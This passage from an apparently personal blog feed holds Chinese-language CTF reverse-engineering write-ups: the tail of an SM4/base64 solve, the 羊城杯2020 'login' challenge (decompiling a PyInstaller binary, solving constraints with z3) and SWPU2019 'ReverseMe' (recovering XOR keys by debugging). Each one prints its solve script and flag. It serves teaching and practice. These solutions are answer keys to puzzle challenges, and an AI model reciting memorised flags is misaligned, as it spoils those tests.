class="number">1</span>], flag[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(i, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">keyboard = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">keynext = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(keyboard)):</span><br><span class="line">    <span class="keyword">if</span> keyboard[i] &gt;= <span class="string">&#x27;A&#x27;</span> <span class="keyword">and</span> keyboard[i] &lt;= <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">        keynext += <span class="built_in">chr</span>(<span class="built_in">ord</span>(keyboard[i]) + <span class="number">32</span>)</span><br><span class="line">    <span class="keyword">elif</span> keyboard[i] &gt;= <span class="string">&#x27;a&#x27;</span> <span class="keyword">and</span> keyboard[i] &lt;= <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">        keynext += <span class="built_in">chr</span>(<span class="built_in">ord</span>(keyboard[i]) - <span class="number">32</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        keynext += keyboard[i]</span><br><span class="line"></span><br><span class="line">keynext = keynext[<span class="number">24</span>:] + keynext[<span class="number">0</span>:<span class="number">24</span>]</span><br><span class="line"><span class="built_in">print</span>(keynext)</span><br><span class="line"></span><br><span class="line">change = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    x = keynext.find(flag[i])</span><br><span class="line">    change += keyboard[x]</span><br><span class="line"></span><br><span class="line">change += <span class="string">&quot;==&quot;</span></span><br><span class="line"><span class="built_in">print</span>(change)</span><br><span class="line"></span><br><span class="line">sm4key = <span class="string">&quot;where_are_u_now?&quot;</span></span><br><span class="line"></span><br><span class="line">x = base64.b64decode(change)</span><br><span class="line">x = <span class="built_in">list</span>(x)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(i), end=<span class="string">&quot;, &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(sm4key)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">ord</span>(sm4key[i])), end=<span class="string">&quot;, &quot;</span>)</span><br><span class="line">hexflag = <span class="number">0x59d095290df2400614f48d276906874e</span></span><br><span class="line">hexkey = <span class="number">0x77686572655f6172655f755f6e6f773f</span></span><br><span class="line">deflag = pysm4.decrypt(hexflag, hexkey)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag&#123;&#x27;</span>+<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(deflag)[<span class="number">2</span>:]).decode()+<span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></div></figure><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;SM4foRExcepioN?!&#125;</span><br></pre></td></tr></table></div></figure>]]></content>
      
      
      <categories>
          
          <category> rewp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>羊城杯2020 login</title>
      <link href="/2022/11/05/login/"/>
      <url>/2022/11/05/login/</url>
      
        <content type="html"><![CDATA[        <h2 id="羊城杯-2020-login"   >          <a href="#羊城杯-2020-login" class="heading-link"><i class="fas fa-link"></i></a><a href="#羊城杯-2020-login" class="headerlink" title="[羊城杯 2020]login"></a>[羊城杯 2020]login</h2>      <p>py.exe 文件</p><p>用pyinstxtractor解出pyc后</p><p>利用struct改文件头</p><p>再用uncompyle6反编译</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.8.0</span></span><br><span class="line"><span class="comment"># Python bytecode 3.6 (3379)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.9.7 (tags/v3.9.7:1016ef3, Aug 30 2021, 20:19:38) [MSC v.1929 64 bit (AMD64)]</span></span><br><span class="line"><span class="comment"># Embedded file name: login.py</span></span><br><span class="line"><span class="comment"># Compiled at: 1995-09-28 00:18:56</span></span><br><span class="line"><span class="comment"># Size of source mod 2**32: 257 bytes</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">input1 = <span class="built_in">input</span>(<span class="string">&#x27;input something:&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(input1) != <span class="number">14</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Wrong length!&#x27;</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    code = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">        code.append(<span class="built_in">ord</span>(input1[i]) ^ <span class="built_in">ord</span>(input1[(i + <span class="number">1</span>)]))</span><br><span class="line"></span><br><span class="line">    code.append(<span class="built_in">ord</span>(input1[<span class="number">13</span>]))</span><br><span class="line">    a1 = code[<span class="number">2</span>]</span><br><span class="line">    a2 = code[<span class="number">1</span>]</span><br><span class="line">    a3 = code[<span class="number">0</span>]</span><br><span class="line">    a4 = code[<span class="number">3</span>]</span><br><span class="line">    a5 = code[<span class="number">4</span>]</span><br><span class="line">    a6 = code[<span class="number">5</span>]</span><br><span class="line">    a7 = code[<span class="number">6</span>]</span><br><span class="line">    a8 = code[<span class="number">7</span>]</span><br><span class="line">    a9 = code[<span class="number">9</span>]</span><br><span class="line">    a10 = code[<span class="number">8</span>]</span><br><span class="line">    a11 = code[<span class="number">10</span>]</span><br><span class="line">    a12 = code[<span class="number">11</span>]</span><br><span class="line">    a13 = code[<span class="number">12</span>]</span><br><span class="line">    a14 = code[<span class="number">13</span>]</span><br><span class="line">    <span class="keyword">if</span> (a1 * <span class="number">88</span> + a2 * <span class="number">67</span> + a3 * <span class="number">65</span> - a4 * <span class="number">5</span> + a5 * <span class="number">43</span> + a6 * <span class="number">89</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">36</span> + a10 * <span class="number">15</span> + a11 * <span class="number">11</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> + a14 * <span class="number">29</span> == <span class="number">22748</span>) &amp; (a1 * <span class="number">89</span> + a2 * <span class="number">7</span> + a3 * <span class="number">12</span> - a4 * <span class="number">25</span> + a5 * <span class="number">41</span> + a6 * <span class="number">23</span> + a7 * <span class="number">20</span> - a8 * <span class="number">66</span> + a9 * <span class="number">31</span> + a10 * <span class="number">8</span> + a11 * <span class="number">2</span> - a12 * <span class="number">41</span> - a13 * <span class="number">39</span> + a14 * <span class="number">17</span> == <span class="number">7258</span>) &amp; (a1 * <span class="number">28</span> + a2 * <span class="number">35</span> + a3 * <span class="number">16</span> - a4 * <span class="number">65</span> + a5 * <span class="number">53</span> + a6 * <span class="number">39</span> + a7 * <span class="number">27</span> + a8 * <span class="number">15</span> - a9 * <span class="number">33</span> + a10 * <span class="number">13</span> + a11 * <span class="number">101</span> + a12 * <span class="number">90</span> - a13 * <span class="number">34</span> + a14 * <span class="number">23</span> == <span class="number">26190</span>) &amp; (a1 * <span class="number">23</span> + a2 * <span class="number">34</span> + a3 * <span class="number">35</span> - a4 * <span class="number">59</span> + a5 * <span class="number">49</span> + a6 * <span class="number">81</span> + a7 * <span class="number">25</span> + (a8 &lt;&lt; <span class="number">7</span>) - a9 * <span class="number">32</span> + a10 * <span class="number">75</span> + a11 * <span class="number">81</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> + a14 * <span class="number">29</span> == <span class="number">37136</span>) &amp; (a1 * <span class="number">38</span> + a2 * <span class="number">97</span> + a3 * <span class="number">35</span> - a4 * <span class="number">52</span> + a5 * <span class="number">42</span> + a6 * <span class="number">79</span> + a7 * <span class="number">90</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span> + a10 * <span class="number">57</span> + a11 * <span class="number">81</span> + a12 * <span class="number">42</span> - a13 * <span class="number">62</span> - a14 * <span class="number">11</span> == <span class="number">27915</span>) &amp; (a1 * <span class="number">22</span> + a2 * <span class="number">27</span> + a3 * <span class="number">35</span> - a4 * <span class="number">45</span> + a5 * <span class="number">47</span> + a6 * <span class="number">49</span> + a7 * <span class="number">29</span> + a8 * <span class="number">18</span> - a9 * <span class="number">26</span> + a10 * <span class="number">35</span> + a11 * <span class="number">41</span> + a12 * <span class="number">40</span> - a13 * <span class="number">61</span> + a14 * <span class="number">28</span> == <span class="number">17298</span>) &amp; (a1 * <span class="number">12</span> + a2 * <span class="number">45</span> + a3 * <span class="number">35</span> - a4 * <span class="number">9</span> - a5 * <span class="number">42</span> + a6 * <span class="number">86</span> + a7 * <span class="number">23</span> + a8 * <span class="number">85</span> - a9 * <span class="number">47</span> + a10 * <span class="number">34</span> + a11 * <span class="number">76</span> + a12 * <span class="number">43</span> - a13 * <span class="number">44</span> + a14 * <span class="number">65</span> == <span class="number">19875</span>) &amp; (a1 * <span class="number">79</span> + a2 * <span class="number">62</span> + a3 * <span class="number">35</span> - a4 * <span class="number">85</span> + a5 * <span class="number">33</span> + a6 * <span class="number">79</span> + a7 * <span class="number">86</span> + a8 * <span class="number">14</span> - a9 * <span class="number">30</span> + a10 * <span class="number">25</span> + a11 * <span class="number">11</span> + a12 * <span class="number">57</span> - a13 * <span class="number">50</span> - a14 * <span class="number">9</span> == <span class="number">22784</span>) &amp; (a1 * <span class="number">8</span> + a2 * <span class="number">6</span> + a3 * <span class="number">64</span> - a4 * <span class="number">85</span> + a5 * <span class="number">73</span> + a6 * <span class="number">29</span> + a7 * <span class="number">2</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span> + a10 * <span class="number">5</span> + a11 * <span class="number">2</span> + a12 * <span class="number">47</span> - a13 * <span class="number">64</span> + a14 * <span class="number">27</span> == <span class="number">9710</span>) &amp; (a1 * <span class="number">67</span> - a2 * <span class="number">68</span> + a3 * <span class="number">68</span> - a4 * <span class="number">51</span> - a5 * <span class="number">43</span> + a6 * <span class="number">81</span> + a7 * <span class="number">22</span> - a8 * <span class="number">12</span> - a9 * <span class="number">38</span> + a10 * <span class="number">75</span> + a11 * <span class="number">41</span> + a12 * <span class="number">27</span> - a13 * <span class="number">52</span> + a14 * <span class="number">31</span> == <span class="number">13376</span>) &amp; (a1 * <span class="number">85</span> + a2 * <span class="number">63</span> + a3 * <span class="number">5</span> - a4 * <span class="number">51</span> + a5 * <span class="number">44</span> + a6 * <span class="number">36</span> + a7 * <span class="number">28</span> + a8 * <span class="number">15</span> - a9 * <span class="number">6</span> + a10 * <span class="number">45</span> + a11 * <span class="number">31</span> + a12 * <span class="number">7</span> - a13 * <span class="number">67</span> + a14 * <span class="number">78</span> == <span class="number">24065</span>) &amp; (a1 * <span class="number">47</span> + a2 * <span class="number">64</span> + a3 * <span class="number">66</span> - a4 * <span class="number">5</span> + a5 * <span class="number">43</span> + a6 * <span class="number">112</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">35</span> + a10 * <span class="number">95</span> + a11 * <span class="number">21</span> + a12 * <span class="number">43</span> - a13 * <span class="number">61</span> + a14 * <span class="number">20</span> == <span class="number">27687</span>) &amp; (a1 * <span class="number">89</span> + a2 * <span class="number">67</span> + a3 * <span class="number">85</span> - a4 * <span class="number">25</span> + a5 * <span class="number">49</span> + a6 * <span class="number">89</span> + a7 * <span class="number">23</span> + a8 * <span class="number">56</span> - a9 * <span class="number">92</span> + a10 * <span class="number">14</span> + a11 * <span class="number">89</span> + a12 * <span class="number">47</span> - a13 * <span class="number">61</span> - a14 * <span class="number">29</span> == <span class="number">29250</span>) &amp; (a1 * <span class="number">95</span> + a2 * <span class="number">34</span> + a3 * <span class="number">62</span> - a4 * <span class="number">9</span> - a5 * <span class="number">43</span> + a6 * <span class="number">83</span> + a7 * <span class="number">25</span> + a8 * <span class="number">12</span> - a9 * <span class="number">36</span> + a10 * <span class="number">16</span> + a11 * <span class="number">51</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> - a14 * <span class="number">24</span> == <span class="number">15317</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;flag is GWHT&#123;md5(your_input)&#125;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Congratulations and have fun!&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Sorry,plz try again...&#x27;</span>)</span><br><span class="line"><span class="comment"># okay decompiling login.pyc</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>直接z3</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">code = [BitVec(<span class="string">&#x27;code[%d]&#x27;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>)]</span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a1 = code[<span class="number">2</span>]</span><br><span class="line">a2 = code[<span class="number">1</span>]</span><br><span class="line">a3 = code[<span class="number">0</span>]</span><br><span class="line">a4 = code[<span class="number">3</span>]</span><br><span class="line">a5 = code[<span class="number">4</span>]</span><br><span class="line">a6 = code[<span class="number">5</span>]</span><br><span class="line">a7 = code[<span class="number">6</span>]</span><br><span class="line">a8 = code[<span class="number">7</span>]</span><br><span class="line">a9 = code[<span class="number">9</span>]</span><br><span class="line">a10 = code[<span class="number">8</span>]</span><br><span class="line">a11 = code[<span class="number">10</span>]</span><br><span class="line">a12 = code[<span class="number">11</span>]</span><br><span class="line">a13 = code[<span class="number">12</span>]</span><br><span class="line">a14 = code[<span class="number">13</span>]</span><br><span class="line">s.add (a1 * <span class="number">88</span> + a2 * <span class="number">67</span> + a3 * <span class="number">65</span> - a4 * <span class="number">5</span> + a5 * <span class="number">43</span> + a6 * <span class="number">89</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">36</span> + a10 * <span class="number">15</span> + a11 * <span class="number">11</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> + a14 * <span class="number">29</span> == <span class="number">22748</span>)</span><br><span class="line">s.add (a1 * <span class="number">89</span> + a2 * <span class="number">7</span> + a3 * <span class="number">12</span> - a4 * <span class="number">25</span> + a5 * <span class="number">41</span> + a6 * <span class="number">23</span> + a7 * <span class="number">20</span> - a8 * <span class="number">66</span> + a9 * <span class="number">31</span> + a10 * <span class="number">8</span> + a11 * <span class="number">2</span> - a12 * <span class="number">41</span> - a13 * <span class="number">39</span> + a14 * <span class="number">17</span> == <span class="number">7258</span>)</span><br><span class="line">s.add (a1 * <span class="number">28</span> + a2 * <span class="number">35</span> + a3 * <span class="number">16</span> - a4 * <span class="number">65</span> + a5 * <span class="number">53</span> + a6 * <span class="number">39</span> + a7 * <span class="number">27</span> + a8 * <span class="number">15</span> - a9 * <span class="number">33</span> + a10 * <span class="number">13</span> + a11 * <span class="number">101</span> + a12 * <span class="number">90</span> - a13 * <span class="number">34</span> + a14 * <span class="number">23</span> == <span class="number">26190</span>)</span><br><span class="line">s.add (a1 * <span class="number">23</span> + a2 * <span class="number">34</span> + a3 * <span class="number">35</span> - a4 * <span class="number">59</span> + a5 * <span class="number">49</span> + a6 * <span class="number">81</span> + a7 * <span class="number">25</span> + (a8 &lt;&lt; <span class="number">7</span>) - a9 * <span class="number">32</span> + a10 * <span class="number">75</span> + a11 * <span class="number">81</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> + a14 * <span class="number">29</span> == <span class="number">37136</span>)</span><br><span class="line">s.add(a1 * <span class="number">38</span> + a2 * <span class="number">97</span> + a3 * <span class="number">35</span> - a4 * <span class="number">52</span> + a5 * <span class="number">42</span> + a6 * <span class="number">79</span> + a7 * <span class="number">90</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span> + a10 * <span class="number">57</span> + a11 * <span class="number">81</span> + a12 * <span class="number">42</span> - a13 * <span class="number">62</span> - a14 * <span class="number">11</span> == <span class="number">27915</span>)</span><br><span class="line">s.add(a1 * <span class="number">22</span> + a2 * <span class="number">27</span> + a3 * <span class="number">35</span> - a4 * <span class="number">45</span> + a5 * <span class="number">47</span> + a6 * <span class="number">49</span> + a7 * <span class="number">29</span> + a8 * <span class="number">18</span> - a9 * <span class="number">26</span> + a10 * <span class="number">35</span> + a11 * <span class="number">41</span> + a12 * <span class="number">40</span> - a13 * <span class="number">61</span> + a14 * <span class="number">28</span> == <span class="number">17298</span>)</span><br><span class="line">s.add(a1 * <span class="number">12</span> + a2 * <span class="number">45</span> + a3 * <span class="number">35</span> - a4 * <span class="number">9</span> - a5 * <span class="number">42</span> + a6 * <span class="number">86</span> + a7 * <span class="number">23</span> + a8 * <span class="number">85</span> - a9 * <span class="number">47</span> + a10 * <span class="number">34</span> + a11 * <span class="number">76</span> + a12 * <span class="number">43</span> - a13 * <span class="number">44</span> + a14 * <span class="number">65</span> == <span class="number">19875</span>)</span><br><span class="line">s.add(a1 * <span class="number">79</span> + a2 * <span class="number">62</span> + a3 * <span class="number">35</span> - a4 * <span class="number">85</span> + a5 * <span class="number">33</span> + a6 * <span class="number">79</span> + a7 * <span class="number">86</span> + a8 * <span class="number">14</span> - a9 * <span class="number">30</span> + a10 * <span class="number">25</span> + a11 * <span class="number">11</span> + a12 * <span class="number">57</span> - a13 * <span class="number">50</span> - a14 * <span class="number">9</span> == <span class="number">22784</span>)</span><br><span class="line">s.add(a1 * <span class="number">8</span> + a2 * <span class="number">6</span> + a3 * <span class="number">64</span> - a4 * <span class="number">85</span> + a5 * <span class="number">73</span> + a6 * <span class="number">29</span> + a7 * <span class="number">2</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span> + a10 * <span class="number">5</span> + a11 * <span class="number">2</span> + a12 * <span class="number">47</span> - a13 * <span class="number">64</span> + a14 * <span class="number">27</span> == <span class="number">9710</span>)</span><br><span class="line">s.add(a1 * <span class="number">67</span> - a2 * <span class="number">68</span> + a3 * <span class="number">68</span> - a4 * <span class="number">51</span> - a5 * <span class="number">43</span> + a6 * <span class="number">81</span> + a7 * <span class="number">22</span> - a8 * <span class="number">12</span> - a9 * <span class="number">38</span> + a10 * <span class="number">75</span> + a11 * <span class="number">41</span> + a12 * <span class="number">27</span> - a13 * <span class="number">52</span> + a14 * <span class="number">31</span> == <span class="number">13376</span>)</span><br><span class="line">s.add(a1 * <span class="number">85</span> + a2 * <span class="number">63</span> + a3 * <span class="number">5</span> - a4 * <span class="number">51</span> + a5 * <span class="number">44</span> + a6 * <span class="number">36</span> + a7 * <span class="number">28</span> + a8 * <span class="number">15</span> - a9 * <span class="number">6</span> + a10 * <span class="number">45</span> + a11 * <span class="number">31</span> + a12 * <span class="number">7</span> - a13 * <span class="number">67</span> + a14 * <span class="number">78</span> == <span class="number">24065</span>)</span><br><span class="line">s.add(a1 * <span class="number">47</span> + a2 * <span class="number">64</span> + a3 * <span class="number">66</span> - a4 * <span class="number">5</span> + a5 * <span class="number">43</span> + a6 * <span class="number">112</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">35</span> + a10 * <span class="number">95</span> + a11 * <span class="number">21</span> + a12 * <span class="number">43</span> - a13 * <span class="number">61</span> + a14 * <span class="number">20</span> == <span class="number">27687</span>)</span><br><span class="line">s.add(a1 * <span class="number">89</span> + a2 * <span class="number">67</span> + a3 * <span class="number">85</span> - a4 * <span class="number">25</span> + a5 * <span class="number">49</span> + a6 * <span class="number">89</span> + a7 * <span class="number">23</span> + a8 * <span class="number">56</span> - a9 * <span class="number">92</span> + a10 * <span class="number">14</span> + a11 * <span class="number">89</span> + a12 * <span class="number">47</span> - a13 * <span class="number">61</span> - a14 * <span class="number">29</span> == <span class="number">29250</span>)</span><br><span class="line">s.add(a1 * <span class="number">95</span> + a2 * <span class="number">34</span> + a3 * <span class="number">62</span> - a4 * <span class="number">9</span> - a5 * <span class="number">43</span> + a6 * <span class="number">83</span> + a7 * <span class="number">25</span> + a8 * <span class="number">12</span> - a9 * <span class="number">36</span> + a10 * <span class="number">16</span> + a11 * <span class="number">51</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> - a14 * <span class="number">24</span> == <span class="number">15317</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check():</span><br><span class="line">    result = s.model()</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> code:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(result[each].as_long()), end=<span class="string">&quot;, &quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;no&quot;</span>)</span><br><span class="line"></span><br><span class="line">flag = [<span class="number">0xa</span>, <span class="number">0x18</span>, <span class="number">0x77</span>, <span class="number">0x7</span>, <span class="number">0x68</span>, <span class="number">0x2b</span>, <span class="number">0x1c</span>, <span class="number">0x5b</span>, <span class="number">0x6c</span>, <span class="number">0x34</span>, <span class="number">0x58</span>, <span class="number">0x4a</span>, <span class="number">0x58</span>, <span class="number">0x21</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">    flag[i-<span class="number">1</span>] ^= flag[i]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"></span><br><span class="line">x = hashlib.md5()</span><br><span class="line">x.update(<span class="string">b&#x27;U_G07_th3_k3y!&#x27;</span>)</span><br><span class="line">x.hexdigest()</span><br><span class="line"><span class="built_in">print</span>(x.hexdigest())</span><br></pre></td></tr></table></div></figure><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;58964088b637e50d3a22b9510c1d1ef8&#125;</span><br></pre></td></tr></table></div></figure>]]></content>
      
      
      <categories>
          
          <category> rewp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>swpu2019 ReverseMe</title>
      <link href="/2022/11/05/ReverseMewp/"/>
      <url>/2022/11/05/ReverseMewp/</url>
      
        <content type="html"><![CDATA[        <h2 id="SWPU2019-ReverseMe"   >          <a href="#SWPU2019-ReverseMe" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPU2019-ReverseMe" class="headerlink" title="[SWPU2019]ReverseMe"></a>[SWPU2019]ReverseMe</h2>      <p>ida 32 位</p><p>程序有点复杂，要靠动调来猜测</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132207292.png" alt="image-20221105152613063"></p><p>32位输入</p><p>先和key异或</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132207294.png" alt="image-20221105152649366"></p><p>函数加密后在和flag比较</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132207295.png" alt="image-20221105152757168"></p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202211051528340.png" alt="image-20221105152808059"></p><p>关键在于如何处理加密函数</p><p>函数很复杂但真正影响到的只有这个异或</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132207296.png" alt="image-20221105152911380"></p><p>异或的值是动态生成的，直接动调</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132207297.png" alt="image-20221105152941395"></p><p>调用这个函数会生成一个值，返回到eax寄存器里面</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132207298.png" alt="image-20221105153056753"></p><p>eax中的值就是异或的值</p><p>写脚本</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">enc = [</span><br><span class="line">    <span class="number">0xB3</span>, <span class="number">0x37</span>, <span class="number">0x0F</span>, <span class="number">0xF8</span>, <span class="number">0xBC</span>, <span class="number">0xBC</span>, <span class="number">0xAE</span>, <span class="number">0x5D</span>, <span class="number">0xBA</span>, <span class="number">0x5A</span>,</span><br><span class="line">    <span class="number">0x4D</span>, <span class="number">0x86</span>, <span class="number">0x44</span>, <span class="number">0x97</span>, <span class="number">0x62</span>, <span class="number">0xD3</span>, <span class="number">0x4F</span>, <span class="number">0xBA</span>, <span class="number">0x24</span>, <span class="number">0x16</span>,</span><br><span class="line">    <span class="number">0x0B</span>, <span class="number">0x9F</span>, <span class="number">0x72</span>, <span class="number">0x1A</span>, <span class="number">0x65</span>, <span class="number">0x68</span>, <span class="number">0x6D</span>, <span class="number">0x26</span>, <span class="number">0xBA</span>, <span class="number">0x6B</span>,</span><br><span class="line">    <span class="number">0xC8</span>, <span class="number">0x67</span>]</span><br><span class="line"></span><br><span class="line">xor = [<span class="number">0x86</span>, <span class="number">0xc</span>, <span class="number">0x3e</span>, <span class="number">0xca</span>, <span class="number">0x98</span>, <span class="number">0xd7</span>, <span class="number">0xae</span>, <span class="number">0x19</span>,</span><br><span class="line">       <span class="number">0xe2</span>, <span class="number">0x77</span>, <span class="number">0x6b</span>, <span class="number">0xa6</span>, <span class="number">0x6a</span>, <span class="number">0xa1</span>, <span class="number">0x77</span>, <span class="number">0xb0</span>,</span><br><span class="line">       <span class="number">0x69</span>, <span class="number">0x91</span>, <span class="number">0x37</span>, <span class="number">0x5</span>, <span class="number">0x7a</span>, <span class="number">0xf9</span>, <span class="number">0x7b</span>, <span class="number">0x30</span>,</span><br><span class="line">       <span class="number">0x43</span>, <span class="number">0x5a</span>, <span class="number">0x4b</span>, <span class="number">0x10</span>, <span class="number">0x86</span>, <span class="number">0x7d</span>, <span class="number">0xd4</span>, <span class="number">0x28</span>]</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;SWPU_2019_CTF&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    x = enc[i] ^ xor[i]</span><br><span class="line">    x = x ^ <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(x &amp; <span class="number">0xff</span>), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Y0uaretheB3st!#@_VirtualCC&#125;</span><br></pre></td></tr></table></div></figure>]]></content>
      
      
      <categories>
          
          <category> rewp </category>
